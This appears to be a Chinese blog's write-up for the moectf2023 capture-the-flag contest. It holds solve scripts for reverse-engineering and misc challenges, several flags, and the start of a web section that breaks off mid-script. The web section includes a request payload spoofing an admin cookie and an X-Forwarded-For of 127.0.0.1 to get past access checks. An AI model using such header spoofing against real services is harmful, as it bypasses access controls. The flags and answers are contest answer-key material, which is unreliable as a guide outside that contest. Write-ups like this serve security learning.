

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/url.jpg">
  <link rel="icon" href="/img/url.jpg">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="J_0k3r">
  <meta name="keywords" content="">
  
    <meta name="description" content="从何时你也学会不要离群 从何时发觉没有同伴不行 -《任我行》陈奕迅">
<meta property="og:type" content="article">
<meta property="og:title" content="moectf2023 wp">
<meta property="og:url" content="http://example.com/2023/10/16/moectf2023/index.html">
<meta property="og:site_name" content="J_0k3r">
<meta property="og:description" content="从何时你也学会不要离群 从何时发觉没有同伴不行 -《任我行》陈奕迅">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://example.com/img/wp43.jpg">
<meta property="article:published_time" content="2023-10-16T10:17:32.000Z">
<meta property="article:modified_time" content="2023-10-19T16:00:25.588Z">
<meta property="article:author" content="J_0k3r">
<meta property="article:tag" content="Write Up">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="http://example.com/img/wp43.jpg">
  
  
  
  <title>moectf2023 wp - J_0k3r</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":150,"cursorChar":"_","loop":true,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  


  
<meta name="generator" content="Hexo 5.4.2"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>J_0k3r的秘密基地</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                <span>首页</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                <span>归档</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                <span>分类</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                <span>标签</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                <span>关于</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/links/">
                <i class="iconfont icon-link-fill"></i>
                <span>友链</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/wp42.jpg') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="moectf2023 wp"></span>
          
        </div>

        
          
  <div class="mt-3">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-author" aria-hidden="true"></i>
        J_0k3r
      </span>
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2023-10-16 18:17" pubdate>
          2023年10月16日 晚上
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          74k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          615 分钟
        
      </span>
    

    
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">moectf2023 wp</h1>
            
            
              <div class="markdown-body">
                
                <h1 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h1><h3 id="RRRRRc4"><a href="#RRRRRc4" class="headerlink" title="RRRRRc4"></a>RRRRRc4</h3><p><img src="/mdimg/moectf2023/1.png" srcset="/img/loading.gif" lazyload></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">rc4_init</span>(<span class="hljs-params">s, key, Len_k</span>):<br>    i = <span class="hljs-number">0</span><br>    j = <span class="hljs-number">0</span><br>    k = [<span class="hljs-number">0</span>] * <span class="hljs-number">256</span><br>    tmp = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        s[i] = i<br>        k[i] = key[i % Len_k]<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        j = (j + s[i] + k[i]) % <span class="hljs-number">256</span><br>        tmp = s[i]<br>        s[i] = s[j]<br>        s[j] = tmp<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rc4_crypt</span>(<span class="hljs-params">Data, Len_D, key, Len_k</span>):<br>    s = [<span class="hljs-number">0</span>] * <span class="hljs-number">256</span><br>    rc4_init(s, key, Len_k)<br>    i = <span class="hljs-number">0</span><br>    j = <span class="hljs-number">0</span><br>    t = <span class="hljs-number">0</span><br>    k = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(Len_D):<br>        i = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span><br>        j = (j + s[i]) % <span class="hljs-number">256</span><br>        tmp = s[i]<br>        s[i] = s[j]<br>        s[j] = tmp<br>        t = (s[i] + s[j]) % <span class="hljs-number">256</span><br>        Data[k] = Data[k] ^ s[t]<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    key = <span class="hljs-string">&quot;moectf2023&quot;</span>.encode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br>    key_len = <span class="hljs-built_in">len</span>(key)<br><br>    data = <span class="hljs-built_in">bytearray</span>([<span class="hljs-number">0x1B</span>, <span class="hljs-number">0x9B</span>, <span class="hljs-number">0xFB</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x6A</span>, <span class="hljs-number">0xB5</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0x7C</span>, <span class="hljs-number">0xBA</span>,<br>                      <span class="hljs-number">0x03</span>, <span class="hljs-number">0xF3</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0xB8</span>, <span class="hljs-number">0xB6</span>, <span class="hljs-number">0x3D</span>, <span class="hljs-number">0x8A</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x2E</span>,<br>                      <span class="hljs-number">0x50</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0xE7</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0xB1</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0xCF</span>, <span class="hljs-number">0xF3</span>, <span class="hljs-number">0xAE</span>,<br>                      <span class="hljs-number">0x03</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0xB2</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0xFB</span>, <span class="hljs-number">0xDC</span>, <span class="hljs-number">0x22</span>])<br><br>    rc4_crypt(data, <span class="hljs-built_in">len</span>(data), key, key_len)<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(data)):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(data[i]), end=<span class="hljs-string">&quot;&quot;</span>)<br>    <span class="hljs-built_in">print</span>()<br><span class="hljs-comment">#moectf&#123;y0u_r3a11y_understand_rc4!!!!&#125;</span><br><br></code></pre></td></tr></table></figure>

<h3 id="base-64"><a href="#base-64" class="headerlink" title="base_64"></a>base_64</h3><p><img src="/mdimg/moectf2023/2.png" srcset="/img/loading.gif" lazyload><br>base64换表</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> string<br><br>str1 = <span class="hljs-string">&quot;yD9oB3Inv3YAB19YynIuJnUaAGB0um0=&quot;</span><br>string1 = <span class="hljs-string">&quot;ZYXWVUTSRQPONMLKJIHGFEDCBAzyxwvutsrqponmlkjihgfedcba0123456789+/&quot;</span><br>string2 = <span class="hljs-string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span><br><br><span class="hljs-built_in">print</span> (base64.b64decode(str1.translate(<span class="hljs-built_in">str</span>.maketrans(string1,string2))))<br></code></pre></td></tr></table></figure>

<h3 id="Xor"><a href="#Xor" class="headerlink" title="Xor"></a>Xor</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">enc=[<span class="hljs-number">0x54</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0x5A</span>, <span class="hljs-number">0x4D</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x60</span>,<br>        <span class="hljs-number">0x56</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0x66</span>,<br>        <span class="hljs-number">0x51</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x4D</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x61</span>,<br>        <span class="hljs-number">0x09</span>, <span class="hljs-number">0x6B</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0x44</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> enc:<br>	<span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(i^<span class="hljs-number">0x39</span>),end=<span class="hljs-string">&#x27;&#x27;</span>)<br></code></pre></td></tr></table></figure>

<h3 id="ANDROIFD"><a href="#ANDROIFD" class="headerlink" title="ANDROIFD"></a>ANDROIFD</h3><p><img src="/mdimg/moectf2023/3.png" srcset="/img/loading.gif" lazyload><br><img src="/mdimg/moectf2023/4.png" srcset="/img/loading.gif" lazyload></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python">enc=[<span class="hljs-number">25</span>, <span class="hljs-number">7</span>, <span class="hljs-number">0</span>, <span class="hljs-number">14</span>, <span class="hljs-number">27</span>, <span class="hljs-number">3</span>, <span class="hljs-number">16</span>, <span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-number">24</span>, <span class="hljs-number">2</span>, <span class="hljs-string">&#x27;\t&#x27;</span>, <span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-number">4</span>, <span class="hljs-number">1</span>, <span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-string">&#x27;*&#x27;</span>, <span class="hljs-number">11</span>, <span class="hljs-number">29</span>, <span class="hljs-number">6</span>, <span class="hljs-number">7</span>, <span class="hljs-string">&#x27;\f&#x27;</span>, <span class="hljs-string">&#x27;\t&#x27;</span>, <span class="hljs-string">&#x27;0&#x27;</span>, <span class="hljs-string">&#x27;T&#x27;</span>, <span class="hljs-number">24</span>, <span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-number">28</span>, <span class="hljs-number">21</span>, <span class="hljs-number">27</span>, <span class="hljs-number">28</span>, <span class="hljs-number">16</span>]<br>a=[]<br>key=<span class="hljs-string">&#x27;themoekey&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> enc:<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(i,<span class="hljs-built_in">int</span>):<br>        a.append(i)<br>    <span class="hljs-keyword">else</span>:<br>        a.append(<span class="hljs-built_in">ord</span>(i))<br><span class="hljs-comment">#print(a)</span><br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(a)):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(a[x]^<span class="hljs-built_in">ord</span>(key[x%<span class="hljs-built_in">len</span>(key)])),end=<span class="hljs-string">&#x27;&#x27;</span>)<br></code></pre></td></tr></table></figure>
<h3 id="UPX！"><a href="#UPX！" class="headerlink" title="UPX！"></a>UPX！</h3><p><img src="/mdimg/moectf2023/5.png" srcset="/img/loading.gif" lazyload><br>UPX脱壳<br><img src="/mdimg/moectf2023/6.png" srcset="/img/loading.gif" lazyload></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">enc =[<span class="hljs-number">10</span>,   <span class="hljs-number">8</span>,   <span class="hljs-number">2</span>,   <span class="hljs-number">4</span>,  <span class="hljs-number">19</span>,   <span class="hljs-number">1</span>,  <span class="hljs-number">28</span>,  <span class="hljs-number">87</span>,  <span class="hljs-number">15</span>,  <span class="hljs-number">56</span>, <span class="hljs-number">30</span>,  <span class="hljs-number">87</span>,  <span class="hljs-number">18</span>,  <span class="hljs-number">56</span>,  <span class="hljs-number">44</span>,   <span class="hljs-number">9</span>,  <span class="hljs-number">87</span>,  <span class="hljs-number">16</span>,  <span class="hljs-number">56</span>,  <span class="hljs-number">47</span>,  <span class="hljs-number">87</span>,  <span class="hljs-number">16</span>,  <span class="hljs-number">56</span>,  <span class="hljs-number">19</span>,   <span class="hljs-number">8</span>,  <span class="hljs-number">56</span>,  <span class="hljs-number">53</span>,   <span class="hljs-number">2</span>,  <span class="hljs-number">17</span>,  <span class="hljs-number">84</span>, <span class="hljs-number">21</span>,  <span class="hljs-number">20</span>,   <span class="hljs-number">2</span>,  <span class="hljs-number">56</span>,  <span class="hljs-number">50</span>,  <span class="hljs-number">55</span>,  <span class="hljs-number">63</span>,  <span class="hljs-number">70</span>,  <span class="hljs-number">70</span>,  <span class="hljs-number">70</span>, <span class="hljs-number">26</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> enc:<br>	<span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(i^<span class="hljs-number">0x67</span>),end=<span class="hljs-string">&#x27;&#x27;</span>)<br></code></pre></td></tr></table></figure>

<h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h3 id="weird-package"><a href="#weird-package" class="headerlink" title="weird_package"></a>weird_package</h3><p>bandzip修复文件<br><img src="/mdimg/moectf2023/7.png" srcset="/img/loading.gif" lazyload><br>或者7z直接打开压缩包<br>9999是真flag<br><img src="/mdimg/moectf2023/8.png" srcset="/img/loading.gif" lazyload></p>
<h3 id="打不开的图片1"><a href="#打不开的图片1" class="headerlink" title="打不开的图片1"></a>打不开的图片1</h3><p>exif<br><img src="/mdimg/moectf2023/9.png" srcset="/img/loading.gif" lazyload><br><img src="/mdimg/moectf2023/10.png" srcset="/img/loading.gif" lazyload></p>
<h3 id="打不开的图片2"><a href="#打不开的图片2" class="headerlink" title="打不开的图片2"></a>打不开的图片2</h3><p>改png文件头<br><img src="/mdimg/moectf2023/11.png" srcset="/img/loading.gif" lazyload></p>
<h3 id="狗子-1-普通的猫"><a href="#狗子-1-普通的猫" class="headerlink" title="狗子(1) 普通的猫"></a>狗子(1) 普通的猫</h3><p><img src="/mdimg/moectf2023/12.png" srcset="/img/loading.gif" lazyload></p>
<h3 id="building-near-lake"><a href="#building-near-lake" class="headerlink" title="building_near_lake"></a>building_near_lake</h3><p><img src="/mdimg/moectf2023/13.png" srcset="/img/loading.gif" lazyload></p>
<h3 id="烫烫烫"><a href="#烫烫烫" class="headerlink" title="烫烫烫"></a>烫烫烫</h3><p>随波逐流得到</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">这是你的flag：<br><br>a9736d8ad21107398b73324694cbcd11f66e3befe67016def21dcaa9ab143bc4405be596245361f98db6a0047b4be78ede40864eb988d8a4999cdcb31592fd42c7b73df3b492403c9a379a9ff5e81262<br><br>但是flag用AES加密了，key是下面这行字的sha256（<span class="hljs-built_in">hash</span>值的开头是b34edc782d68fda34dc23329）<br><br>所以说，codepage真的很重要啊（<br></code></pre></td></tr></table></figure>
<p><img src="/mdimg/moectf2023/14.png" srcset="/img/loading.gif" lazyload></p>
<h3 id="狗子-2-照片"><a href="#狗子-2-照片" class="headerlink" title="狗子(2) 照片"></a>狗子(2) 照片</h3><p>zsteg嗦<br><img src="/mdimg/moectf2023/15.png" srcset="/img/loading.gif" lazyload></p>
<h3 id="base乐队"><a href="#base乐队" class="headerlink" title="base乐队"></a>base乐队</h3><p>basecrack 然后栅栏4 然后base64</p>
<h3 id="奇怪的压缩包"><a href="#奇怪的压缩包" class="headerlink" title="奇怪的压缩包"></a>奇怪的压缩包</h3><p>word，ppt都是压缩包<br>改ppt后缀打开<br>ctrl+a<img src="/mdimg/moectf2023/16.png" srcset="/img/loading.gif" lazyload><br>第三页图片移开看注释<br>第四页移开图片<br>最后一页拖动文本框可以看见</p>
<h3 id="机位查询"><a href="#机位查询" class="headerlink" title="机位查询"></a>机位查询</h3><p><code>**moectf&#123;jiashi_baisheng_huijin&#125;**</code></p>
<h3 id="狗子-3-寝室"><a href="#狗子-3-寝室" class="headerlink" title="狗子(3) 寝室"></a>狗子(3) 寝室</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> zipfile<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> rarfile<br><span class="hljs-keyword">import</span> tarfile<br><span class="hljs-keyword">import</span> py7zr<br><br>a=<span class="hljs-number">9999</span><br><span class="hljs-keyword">while</span> a!=<span class="hljs-number">0</span>:<br>  zipname=<span class="hljs-string">&#x27;shell&#x27;</span>+<span class="hljs-built_in">str</span>(a)+<span class="hljs-string">&#x27;.zip&#x27;</span><br>  <span class="hljs-keyword">if</span>(os.path.exists(zipname)):<br>    zfile=zipfile.ZipFile(zipname)<br>    zfile.extractall()<br>    zfile.close()<br>    a-=<span class="hljs-number">1</span><br>  rarname=<span class="hljs-string">&#x27;shell&#x27;</span>+<span class="hljs-built_in">str</span>(a)+<span class="hljs-string">&#x27;.rar&#x27;</span><br>  <span class="hljs-keyword">if</span>(os.path.exists(rarname)):<br>    rfile=rarfile.RarFile(rarname)<br>    rfile.extractall()<br>    rfile.close()<br>    a-=<span class="hljs-number">1</span><br>  tarname=<span class="hljs-string">&#x27;shell&#x27;</span>+<span class="hljs-built_in">str</span>(a)+<span class="hljs-string">&#x27;.tar.gz&#x27;</span><br>  <span class="hljs-keyword">if</span>(os.path.exists(tarname)):<br>    rfile=tarfile.<span class="hljs-built_in">open</span>(tarname)<br>    rfile.extractall()<br>    rfile.close()<br>    a-=<span class="hljs-number">1</span><br>  zname=<span class="hljs-string">&#x27;shell&#x27;</span>+<span class="hljs-built_in">str</span>(a)+<span class="hljs-string">&#x27;.7z&#x27;</span><br>  <span class="hljs-keyword">if</span>(os.path.exists(zname)):<br>    file=py7zr.SevenZipFile(zname)<br>    file.extractall()<br>    file.close()<br>    a-=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>

<h3 id="你想要flag吗"><a href="#你想要flag吗" class="headerlink" title="你想要flag吗"></a>你想要flag吗</h3><p><img src="/mdimg/moectf2023/17.jpg" srcset="/img/loading.gif" lazyload><br><img src="/mdimg/moectf2023/18.png" srcset="/img/loading.gif" lazyload><br><strong>rabbit解密</strong></p>
<h3 id="照片冲洗"><a href="#照片冲洗" class="headerlink" title="照片冲洗"></a>照片冲洗</h3><p>分离图片，b神的工具盲水印提取<br><img src="/mdimg/moectf2023/19.png" srcset="/img/loading.gif" lazyload></p>
<h3 id="狗子-4-故乡话"><a href="#狗子-4-故乡话" class="headerlink" title="狗子(4) 故乡话"></a>狗子(4) 故乡话</h3><p><img src="/mdimg/moectf2023/20.png" srcset="/img/loading.gif" lazyload><br><img src="/mdimg/moectf2023/21.png" srcset="/img/loading.gif" lazyload></p>
<h3 id="尊嘟假嘟？"><a href="#尊嘟假嘟？" class="headerlink" title="尊嘟假嘟？"></a>尊嘟假嘟？</h3><p><a target="_blank" rel="noopener" href="https://zdjd.vercel.app/">https://zdjd.vercel.app/</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">cipher: rY5Ah8BtsYYatLEPu8YCPU22Gr5PQt8YGDKkvb4bk3D4JJeEe5kgCpoEqgRzsM7m9d8jEtE3LUoKpULQnMcuAunU1gtpzC5kSUxFctFTNCMZVHLHZNCo5akzKMRY5bbyBP7RNUeGDEYoUc<br>key: the tailing <span class="hljs-number">8</span> <span class="hljs-built_in">bytes</span> of <span class="hljs-built_in">hash</span> of <span class="hljs-string">&quot;zundujiadu?&quot;</span> which begin <span class="hljs-keyword">with</span> b6091904cdfb        <br>iv: the end <span class="hljs-number">8</span> <span class="hljs-built_in">bytes</span> of <span class="hljs-built_in">hash</span> of <span class="hljs-string">&quot;dududu?&quot;</span> which begin <span class="hljs-keyword">with</span> 272bf1da2207                <br><br>hint1: how do Bitcoin addresses encode?<br>hint2: the name of cryptosystem <span class="hljs-keyword">is</span> <span class="hljs-string">&quot;bl****sh&quot;</span><br></code></pre></td></tr></table></figure>
<p>key和iv是sha256<br><img src="/mdimg/moectf2023/22.png" srcset="/img/loading.gif" lazyload></p>
<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h3 id="http"><a href="#http" class="headerlink" title="http"></a>http</h3><p><img src="/mdimg/moectf2023/23.png" srcset="/img/loading.gif" lazyload></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">Payload:<br>GET:UwU=u<br>POST:Luv=u<br>cookie:character=admin<br>x-forwarded-<span class="hljs-keyword">for</span>:<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><br>User-Agent: MoeBrowser<br></code></pre></td></tr></table></figure>
<h3 id="gas-gas-gas"><a href="#gas-gas-gas" class="headerlink" title="gas!gas!gas!"></a>gas!gas!gas!</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoup<br>url=<span class="hljs-string">&#x27;http://localhost:58049/&#x27;</span><br>session=requests.Session()<br>fx = <span class="hljs-number">0</span><br>sd = <span class="hljs-number">0</span><br>data=&#123;<span class="hljs-string">&quot;driver&quot;</span>:<span 